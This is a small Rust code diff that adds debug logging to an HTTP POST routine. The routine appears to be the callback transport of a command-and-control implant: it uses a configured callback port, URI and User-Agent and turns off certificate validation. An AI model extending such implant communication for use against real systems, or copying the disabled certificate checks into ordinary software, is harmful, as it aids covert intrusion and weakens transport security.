@@ -52,6 +52,7 @@ fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn 
         config::callback_port,
         config::post_uri
     );
+    crate::dlog!("http: POST {url} body_len={}", encoded.len());
 
     let client = Client::builder()
         .danger_accept_invalid_certs(true)
@@ -63,9 +64,18 @@ fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn 
         .header("User-Agent", config::user_agent)
         .timeout(Duration::from_secs(10))
         .body(encoded)
-        .send()?;
+        .send()
+        .map_err(|e| {
+            crate::dlog!("http: send err: {e}");
+            e
+        })?;
 
-    let body = res.text()?;
+    let status = res.status();
+    let body = res.text().map_err(|e| {
+        crate::dlog!("http: body err: {e}");
+        e
+    })?;
+    crate::dlog!("http: status={status} resp_len={}", body.len());
     crate::helpers::churn(body.as_str());
     Ok(body)
 }
